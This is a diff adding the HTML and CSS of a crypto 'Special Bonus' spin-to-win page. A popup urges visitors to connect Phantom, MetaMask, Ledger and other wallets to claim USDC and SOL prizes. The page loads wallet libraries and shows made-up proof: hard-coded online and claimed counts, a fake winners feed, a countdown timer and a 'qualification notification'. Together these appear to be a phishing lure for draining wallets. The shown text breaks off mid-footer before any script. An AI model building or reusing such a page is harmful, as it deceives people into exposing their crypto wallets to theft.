@@ -1,0 +1,1765 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Special Bonus – Multi-Coin Rewards</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/dist/index.min.js"></script>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            min-height: 100vh;
+            background: #0a0a0f;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            color: #fff;
+            overflow-x: hidden;
+            margin: 0;
+            padding: 0;
+        }
+
+        .bg-glow {
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 30% 40%, rgba(20, 241, 149, 0.03), transparent 60%),
+                radial-gradient(ellipse at 70% 60%, rgba(153, 69, 255, 0.03), transparent 60%);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* ===== MAIN CARD – FULL SCREEN ===== */
+        .card {
+            background: linear-gradient(145deg, #0d0d16, #0a0a10);
+            border-radius: 0;
+            padding: 20px 18px 18px;
+            max-width: 100%;
+            width: 100%;
+            min-height: 100vh;
+            border: none;
+            box-shadow: none;
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* ===== FOR LARGER SCREENS (PC) ===== */
+        @media (min-width: 768px) {
+            .card {
+                max-width: 700px;
+                margin: 0 auto;
+                border-radius: 32px;
+                min-height: auto;
+                padding: 40px 35px 30px;
+                border: 1px solid rgba(20, 241, 149, 0.08);
+                box-shadow: 0 20px 80px rgba(0, 0, 0, 0.8);
+                margin-top: 20px;
+                margin-bottom: 20px;
+            }
+
+            body {
+                padding: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+            }
+
+            .wheel-wrapper {
+                width: 380px;
+                height: 380px;
+                margin: 10px auto;
+            }
+
+            .seg .label {
+                font-size: 14px;
+            }
+            .seg .sub {
+                font-size: 8px;
+            }
+            .seg-2 .label,
+            .seg-6 .label {
+                font-size: 18px;
+            }
+        }
+
+        /* ===== FOR LARGER SCREENS (1200px+) ===== */
+        @media (min-width: 1200px) {
+            .card {
+                max-width: 820px;
+                padding: 50px 45px 35px;
+                border-radius: 40px;
+            }
+            .wheel-wrapper {
+                width: 420px;
+                height: 420px;
+            }
+            .seg .label {
+                font-size: 16px;
+            }
+            .seg .sub {
+                font-size: 9px;
+            }
+            .seg-2 .label,
+            .seg-6 .label {
+                font-size: 20px;
+            }
+            .title h1 {
+                font-size: 28px;
+            }
+            .claim-reward-btn,
+            .free-spin-btn {
+                font-size: 18px;
+                padding: 16px 24px;
+            }
+        }
+
+        /* ===== PHONE OPTIMIZATION ===== */
+        @media (max-width: 420px) {
+            .card {
+                padding: 14px 12px 16px;
+                min-height: 100vh;
+                border-radius: 0;
+            }
+            .wheel-wrapper {
+                width: min(280px, 78vw);
+                height: min(280px, 78vw);
+            }
+            .seg .label {
+                font-size: 9px;
+            }
+            .seg .sub {
+                font-size: 5px;
+            }
+            .seg-2 .label,
+            .seg-6 .label {
+                font-size: 12px;
+            }
+            .popup-box {
+                padding: 22px 16px;
+            }
+            .wallet-option {
+                font-size: 11px;
+                padding: 8px 12px;
+            }
+            .wallet-option .wallet-icon {
+                width: 20px;
+                height: 20px;
+            }
+            .coin-btn {
+                font-size: 8px;
+                padding: 4px 8px;
+            }
+            .coin-btn .coin-icon {
+                width: 12px;
+                height: 12px;
+            }
+            .social-icons a {
+                width: 32px;
+                height: 32px;
+                font-size: 14px;
+            }
+            .social-icons a .icon-svg {
+                width: 18px;
+                height: 18px;
+            }
+            .total-claimed {
+                font-size: 9px;
+                padding: 3px 12px;
+            }
+            .total-claimed .number {
+                font-size: 11px;
+            }
+            .top-section {
+                gap: 4px;
+            }
+            .connect-top-btn {
+                font-size: 9px;
+                padding: 5px 12px;
+            }
+            .title h1 {
+                font-size: 14px;
+            }
+            .qualification-box .title {
+                font-size: 11px;
+            }
+            .qualification-box .qual-amount {
+                font-size: 15px;
+            }
+            .free-spin-btn {
+                font-size: 12px;
+                padding: 8px 20px;
+            }
+            .claim-reward-btn {
+                font-size: 14px;
+                padding: 12px 16px;
+            }
+            .timer {
+                font-size: 18px;
+            }
+            .winners-feed {
+                max-height: 56px;
+                font-size: 8px;
+            }
+        }
+
+        /* ===== REST OF YOUR EXISTING STYLES ===== */
+        /* Keep all your existing styles below this line */
+        /* ... (copy your existing styles here) ... */
+
+        .top-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .live-badge {
+            font-size: 10px;
+            color: #ff4444;
+            background: rgba(255, 68, 68, 0.08);
+            border: 1px solid rgba(255, 68, 68, 0.15);
+            padding: 4px 14px;
+            border-radius: 30px;
+            animation: pulseRed 2s infinite;
+        }
+        @keyframes pulseRed {
+            0%,
+            100% {
+                opacity: 0.6;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+        .live-badge::before {
+            content: "● ";
+            animation: blink 1.2s infinite;
+        }
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+        }
+
+        .total-claimed {
+            background: rgba(20, 241, 149, 0.06);
+            border: 1px solid rgba(20, 241, 149, 0.12);
+            border-radius: 30px;
+            padding: 4px 16px;
+            font-size: 11px;
+            color: #14F195;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 700;
+            animation: pulseGreen 2s infinite;
+            white-space: nowrap;
+        }
+        @keyframes pulseGreen {
+            0%,
+            100% {
+                box-shadow: 0 0 10px rgba(20, 241, 149, 0.02);
+            }
+            50% {
+                box-shadow: 0 0 20px rgba(20, 241, 149, 0.06);
+            }
+        }
+        .total-claimed .number {
+            font-size: 14px;
+            background: linear-gradient(135deg, #14F195, #9945FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+        }
+        .total-claimed .label {
+            color: #888;
+            font-weight: 400;
+        }
+
+        .connect-top-btn {
+            background: linear-gradient(135deg, #14F195, #0d8a55);
+            border: none;
+            color: #000;
+            font-weight: 800;
+            font-size: 11px;
+            padding: 7px 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+            box-shadow: 0 4px 20px rgba(20, 241, 149, 0.15);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .connect-top-btn:hover {
+            transform: scale(1.04);
+        }
+        .connect-top-btn.connected {
+            background: #1a1a2a;
+            color: #14F195;
+            border: 1px solid #14F195;
+            box-shadow: none;
+        }
+        .connect-top-btn .dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #14F195;
+            margin-right: 4px;
+            animation: blink 1s infinite;
+        }
+
+        .title {
+            text-align: center;
+            margin: 4px 0 2px;
+        }
+        .title h1 {
+            font-size: clamp(15px, 3.8vw, 24px);
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            line-height: 1.3;
+        }
+        .title h1 .highlight {
+            background: linear-gradient(135deg, #14F195, #9945FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .title .sub {
+            font-size: clamp(8px, 1.8vw, 11px);
+            color: #666;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-top: 2px;
+        }
+
+        .coin-selector {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            justify-content: center;
+            margin: 8px 0 10px;
+        }
+        .coin-btn {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: #888;
+            padding: 5px 12px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 10px;
+            transition: 0.3s;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .coin-btn:hover {
+            border-color: rgba(20, 241, 149, 0.3);
+            color: #fff;
+        }
+        .coin-btn.active {
+            border-color: #f7931a;
+            background: rgba(247, 147, 26, 0.08);
+            color: #f7931a;
+        }
+        .coin-btn .coin-icon {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            object-fit: contain;
+        }
+
+        .qualification-box {
+            background: rgba(20, 241, 149, 0.05);
+            border: 1px solid rgba(20, 241, 149, 0.15);
+            border-radius: 20px;
+            padding: 14px 16px;
+            margin: 10px 0 12px;
+            text-align: center;
+            animation: glowPulse 2s infinite;
+        }
+        @keyframes glowPulse {
+            0%,
+            100% {
+                box-shadow: 0 0 20px rgba(20, 241, 149, 0.02);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(20, 241, 149, 0.08);
+            }
+        }
+        .qualification-box .icon {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 2px;
+        }
+        .qualification-box .title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #14F195;
+            margin-bottom: 2px;
+        }
+        .qualification-box .desc {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+        .qualification-box .qual-amount {
+            font-size: 18px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #f7931a, #14F195);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .free-spin-btn {
+            background: linear-gradient(135deg, #f7931a, #e67e22);
+            border: none;
+            color: #fff;
+            font-weight: 900;
+            font-size: 14px;
+            padding: 10px 30px;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 30px rgba(247, 147, 26, 0.2);
+            margin-top: 4px;
+        }
+        .free-spin-btn:hover {
+            transform: scale(1.04);
+            box-shadow: 0 4px 40px rgba(247, 147, 26, 0.3);
+        }
+        .free-spin-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .congrats-box {
+            display: none;
+            background: rgba(20, 241, 149, 0.05);
+            border: 2px solid rgba(20, 241, 149, 0.2);
+            border-radius: 20px;
+            padding: 14px 16px;
+            margin: 10px 0 12px;
+            text-align: center;
+            animation: congratsPop 0.6s ease;
+        }
+        .congrats-box.show {
+            display: block;
+        }
+        @keyframes congratsPop {
+            0% {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .congrats-box .emoji {
+            font-size: 36px;
+            display: block;
+        }
+        .congrats-box .msg {
+            font-size: 16px;
+            font-weight: 800;
+            color: #14F195;
+            margin: 4px 0;
+        }
+        .congrats-box .prize-show {
+            font-size: 22px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #f7931a, #14F195);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .congrats-box .sub-msg {
+            font-size: 11px;
+            color: #888;
+        }
+
+        .wheel-wrapper {
+            position: relative;
+            width: min(340px, 82vw);
+            height: min(340px, 82vw);
+            margin: 4px auto 10px;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            position: relative;
+            transition: transform 5s cubic-bezier(0.13, 0.65, 0.08, 0.98);
+            border: 3px solid rgba(20, 241, 149, 0.2);
+            box-shadow: 0 0 60px rgba(20, 241, 149, 0.04), inset 0 0 60px rgba(20, 241, 149, 0.02);
+            overflow: hidden;
+        }
+
+        .seg {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            top: 0;
+            left: 50%;
+            transform-origin: 0% 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            clip-path: polygon(0 0, 100% 0, 0 100%);
+            padding-left: 20px;
+            padding-bottom: 16px;
+            font-weight: 900;
+            text-align: center;
+            line-height: 1.2;
+            color: #fff;
+            text-shadow: 0 2px 12px rgba(0, 0, 0, 0.9);
+            font-size: clamp(10px, 2.2vw, 14px);
+        }
+        .seg .sub {
+            display: block;
+            font-size: clamp(5px, 1.1vw, 7px);
+            font-weight: 400;
+            opacity: 0.7;
+            margin-top: 1px;
+        }
+
+        .seg-0 {
+            background: #0f1a2e;
+            transform: rotate(0deg);
+        }
+        .seg-1 {
+            background: #1a1020;
+            transform: rotate(45deg);
+        }
+        .seg-2 {
+            background: #0f1a0f;
+            transform: rotate(90deg);
+        }
+        .seg-3 {
+            background: #1a1a0f;
+            transform: rotate(135deg);
+        }
+        .seg-4 {
+            background: #0f0f2e;
+            transform: rotate(180deg);
+        }
+        .seg-5 {
+            background: #1a0f2e;
+            transform: rotate(225deg);
+        }
+        .seg-6 {
+            background: #0f2e1a;
+            transform: rotate(270deg);
+        }
+        .seg-7 {
+            background: #2e0f1a;
+            transform: rotate(315deg);
+        }
+
+        .seg-2 .label,
+        .seg-6 .label {
+            color: #f7931a;
+            font-size: clamp(13px, 2.8vw, 18px);
+            text-shadow: 0 0 30px rgba(247, 147, 26, 0.3);
+        }
+        .seg-2,
+        .seg-6 {
+            background: #0f0f05;
+            border: 1px solid rgba(247, 147, 26, 0.08);
+        }
+
+        .seg .label {
+            transform: rotate(22.5deg);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .wheel-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle at center, #0f0f1a, #050508);
+            border: 2px solid rgba(20, 241, 149, 0.25);
+            border-radius: 50%;
+            width: clamp(46px, 12vw, 62px);
+            height: clamp(46px, 12vw, 62px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            box-shadow: 0 0 50px rgba(20, 241, 149, 0.05);
+            user-select: none;
+            pointer-events: none;
+        }
+        .wheel-center .icon {
+            font-size: clamp(16px, 4vw, 24px);
+            display: block;
+            line-height: 1;
+        }
+        .wheel-center .text {
+            font-size: clamp(5px, 1.2vw, 7px);
+            color: #14F195;
+            font-weight: 800;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 1px;
+            opacity: 0.6;
+        }
+
+        .pointer {
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: clamp(22px, 5vw, 32px);
+            color: #14F195;
+            z-index: 20;
+            filter: drop-shadow(0 0 20px rgba(20, 241, 149, 0.2));
+            line-height: 1;
+            text-shadow: 0 0 20px rgba(20, 241, 149, 0.3);
+        }
+
+        .claim-reward-btn {
+            background: linear-gradient(135deg, #9945FF, #14F195);
+            border: none;
+            color: #fff;
+            font-weight: 900;
+            font-size: 16px;
+            padding: 14px 20px;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 8px 30px rgba(20, 241, 149, 0.15);
+            margin-top: 6px;
+        }
+        .claim-reward-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 40px rgba(20, 241, 149, 0.25);
+        }
+        .claim-reward-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .claim-reward-btn.confirmed {
+            background: #1a1a2a;
+            color: #14F195;
+            border: 1px solid #14F195;
+            box-shadow: none;
+        }
+
+        .timer-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            margin: 10px 0 6px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 6px 14px;
+            flex-wrap: wrap;
+        }
+        .timer-label {
+            font-size: 8px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .timer {
+            font-size: clamp(18px, 4.5vw, 26px);
+            font-weight: 800;
+            color: #14F195;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 3px;
+            min-width: 60px;
+            text-align: center;
+        }
+        .progress-wrap {
+            flex: 1;
+            min-width: 70px;
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 7px;
+            color: #555;
+            margin-bottom: 2px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 30px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #9945FF, #14F195);
+            border-radius: 30px;
+            transition: width 0.6s ease;
+        }
+
+        .winners-feed {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 6px 12px;
+            margin: 8px 0 10px;
+            max-height: 64px;
+            overflow-y: auto;
+            font-size: 9px;
+            color: #666;
+            scrollbar-width: thin;
+        }
+        .winners-feed::-webkit-scrollbar {
+            width: 3px;
+        }
+        .winners-feed::-webkit-scrollbar-thumb {
+            background: #14F195;
+            border-radius: 10px;
+        }
+        .winner-item {
+            padding: 2px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            color: #888;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .winner-item .win-amount {
+            color: #14F195;
+            font-weight: 700;
+        }
+        .winner-item .win-time {
+            color: #444;
+            font-size: 7px;
+        }
+
+        .status {
+            text-align: center;
+            font-size: 10px;
+            color: #666;
+            min-height: 18px;
+            margin-top: 4px;
+        }
+        .status.connected {
+            color: #14F195;
+        }
+        .status.error {
+            color: #ff4444;
+        }
+        .status.success {
+            color: #f7931a;
+        }
+
+        .footer {
+            margin-top: 16px;
+            padding-top: 14px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            text-align: center;
+        }
+
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+        }
+
+        .social-icons a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            transition: 0.3s;
+            text-decoration: none;
+            color: #888;
+            font-size: 18px;
+            font-weight: 700;
+        }
+        .social-icons a:hover {
+            background: rgba(20, 241, 149, 0.08);
+            border-color: rgba(20, 241, 149, 0.2);
+            color: #14F195;
+            transform: translateY(-2px);
+        }
+        .social-icons a .icon-svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+        }
+
+        .copyright {
+            font-size: 10px;
+            color: #444;
+            letter-spacing: 1px;
+        }
+        .copyright .solana-text {
+            background: linear-gradient(135deg, #14F195, #9945FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.88);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(8px);
+            padding: 20px;
+        }
+        .popup-overlay.show {
+            display: flex;
+        }
+
+        .popup-box {
+            background: #0d0d18;
+            border: 2px solid rgba(20, 241, 149, 0.2);
+            border-radius: 32px;
+            padding: 30px 22px 26px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            animation: popIn 0.4s ease;
+            box-shadow: 0 20px 80px rgba(0, 0, 0, 0.6);
+        }
+        @keyframes popIn {
+            0% {
+                transform: scale(0.8) translateY(20px);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1) translateY(0);
+                opacity: 1;
+            }
+        }
+        .popup-box .emoji {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 2px;
+        }
+        .popup-box h2 {
+            color: #14F195;
+            font-size: 18px;
+            margin-bottom: 2px;
+        }
+        .popup-box .desc {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 16px;
+        }
+
+        .wallet-option {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: #ccc;
+            padding: 10px 14px;
+            border-radius: 30px;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            transition: 0.3s;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .wallet-option:hover {
+            border-color: #14F195;
+            background: rgba(20, 241, 149, 0.05);
+            color: #fff;
+        }
+        .wallet-option .wallet-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            object-fit: contain;
+            background: #fff;
+            padding: 2px;
+        }
+
+        .popup-box .btn-secondary {
+            background: transparent;
+            border: 1px solid #333;
+            color: #666;
+            padding: 6px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 4px;
+            font-size: 11px;
+            transition: 0.3s;
+        }
+        .popup-box .btn-secondary:hover {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+
+        .log-box {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-glow"></div>
+
+    <!-- CONNECT POPUP -->
+    <div class="popup-overlay" id="connectPopup">
+        <div class="popup-box">
+            <span class="emoji">🔗</span>
+            <h2>Connect Wallet</h2>
+            <p class="desc">Choose your wallet to claim rewards</p>
+            <button class="wallet-option" data-wallet="phantom">
+                <img class="wallet-icon" src="https://cryptologos.cc/logos/phantom-phntm-logo.png" alt="Phantom"> Phantom
+            </button>
+            <button class="wallet-option" data-wallet="metamask">
+                <img class="wallet-icon" src="https://cryptologos.cc/logos/metamask-metamask-logo.png" alt="MetaMask"> MetaMask
+            </button>
+            <button class="wallet-option" data-wallet="coinbase">
+                <img class="wallet-icon" src="https://cryptologos.cc/logos/coinbase-coinbase-logo.png" alt="Coinbase"> Coinbase
+            </button>
+            <button class="wallet-option" data-wallet="trust">
+                <img class="wallet-icon" src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="Trust"> Trust Wallet
+            </button>
+            <button class="wallet-option" data-wallet="exodus">
+                <img class="wallet-icon" src="https://cryptologos.cc/logos/exodus-exodus-logo.png" alt="Exodus"> Exodus
+            </button>
+            <button class="wallet-option" data-wallet="solflare">
+                <img class="wallet-icon" src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="Solflare"> Solflare
+            </button>
+            <button class="wallet-option" data-wallet="ledger">
+                <img class="wallet-icon" src="https://cryptologos.cc/logos/ledger-ledger-logo.png" alt="Ledger"> Ledger
+            </button>
+            <button class="btn-secondary" id="closeConnect">✕ Cancel</button>
+        </div>
+    </div>
+
+    <!-- MAIN CARD -->
+    <div class="card">
+        <div class="top-section">
+            <span class="live-badge" id="liveUsers">128 online</span>
+            <span class="total-claimed" id="totalClaimed">
+                👥 <span class="label">Users claimed:</span> <span class="number" id="claimedCount">150</span>
+            </span>
+            <button class="connect-top-btn" id="connectTopBtn">
+                <span class="dot"></span> Connect Wallet
+            </button>
+        </div>
+
+        <div class="title">
+            <h1>✨ SPECIAL <span class="highlight">BONUS</span> FOR <span class="highlight">SOLANA</span> & <span class="highlight">USDT</span> USERS</h1>
+            <div class="sub">Spin & win – claim any coin</div>
+        </div>
+
+        <div class="coin-selector" id="coinSelector">
+            <button class="coin-btn active" data-coin="solana">
+                <img class="coin-icon" src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL"> SOL
+            </button>
+            <button class="coin-btn" data-coin="usdt">
+                <img class="coin-icon" src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"> USDT
+            </button>
+            <button class="coin-btn" data-coin="ethereum">
+                <img class="coin-icon" src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH"> ETH
+            </button>
+            <button class="coin-btn" data-coin="bnb">
+                <img class="coin-icon" src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="BNB"> BNB
+            </button>
+        </div>
+
+        <div class="qualification-box" id="qualificationBox">
+            <span class="icon">📩</span>
+            <div class="title">🎯 You have received a qualification notification!</div>
+            <div class="desc">You are eligible for a free spin bonus</div>
+            <div class="qual-amount" id="qualAmount">+ 25 USDC SOL</div>
+            <button class="free-spin-btn" id="freeSpinBtn">🎰 Free Spin</button>
+        </div>
+
+        <div class="congrats-box" id="congratsBox">
+            <span class="emoji">🎉</span>
+            <div class="msg">🎊 Congratulations! You won!</div>
+            <div class="prize-show" id="congratsPrize">250 USDC SOL</div>
+            <div class="sub-msg">Your reward is ready to claim</div>
+        </div>
+
+        <div class="wheel-wrapper">
+            <div class="pointer">▼</div>
+            <div class="wheel" id="wheel">
+                <div class="seg seg-0"><span class="label">250<span class="sub">USDC SOL</span></span></div>
+                <div class="seg seg-1"><span class="label">50<span class="sub">USDC SOL</span></span></div>
+                <div class="seg seg-2"><span class="label">ALL 2X<span class="sub">🔥 BOOST</span></span></div>
+                <div class="seg seg-3"><span class="label">250<span class="sub">USDC SOL</span></span></div>
+                <div class="seg seg-4"><span class="label">50<span class="sub">USDC SOL</span></span></div>
+                <div class="seg seg-5"><span class="label">ALL 2X<span class="sub">🔥 BOOST</span></span></div>
+                <div class="seg seg-6"><span class="label">250<span class="sub">USDC SOL</span></span></div>
+                <div class="seg seg-7"><span class="label">50<span class="sub">USDC SOL</span></span></div>
+                <div class="wheel-center">
+                    <span class="icon">◎</span>
+                    <span class="text">SPIN</span>
+                </div>
+            </div>
+        </div>
+
+        <button class="claim-reward-btn" id="claimRewardBtn">💰 Claim Reward</button>
+
+        <div class="timer-section">
+            <span class="timer-label">⏳ Ends</span>
+            <span class="timer" id="timer">05:00</span>
+            <div class="progress-wrap">
+                <div class="progress-label">
+                    <span>Pool</span>
+                    <span id="progressText">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="winners-feed" id="winnersFeed">
+            <div class="winner-item"><span>🎉 <span class="win-amount">250 USDC SOL</span> by 7xKp...9F3a</span> <span class="win-time">now</span></div>
+            <div class="winner-item"><span>🎉 <span class="win-amount">50 USDC SOL</span> by 0x3F...b2E</span> <span class="win-time">2m</span></div>
+            <div class="winner-item"><span>🎉 <span class="win-amount">ALL 2X</span> by 5nQ8...mP2k</span> <span class="win-time">4m</span></div>
+        </div>
+
+        <div class="status" id="statusMsg">📩 You have a qualification! Click Free Spin</div>
+
+        <div class="footer">
+            <div class="social-icons">
+                <a href="#" target="_blank" title="X (Twitter)">
+                    <svg class="icon-svg" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                    </svg>
+                </a>
+                <a href="#" target="_blank" title="Telegram">
+                    <svg class="icon-svg" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+                    </svg>
+                </a>
+                <a href="#" target="_blank" title="YouTube">
+                    <svg class="icon-svg" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+                    </svg>
+                </a>
+                <a href="#" target="_blank" title="Discord">
+                    <svg class="icon-svg" viewBox="0 0 24 24" fill="currentColor">
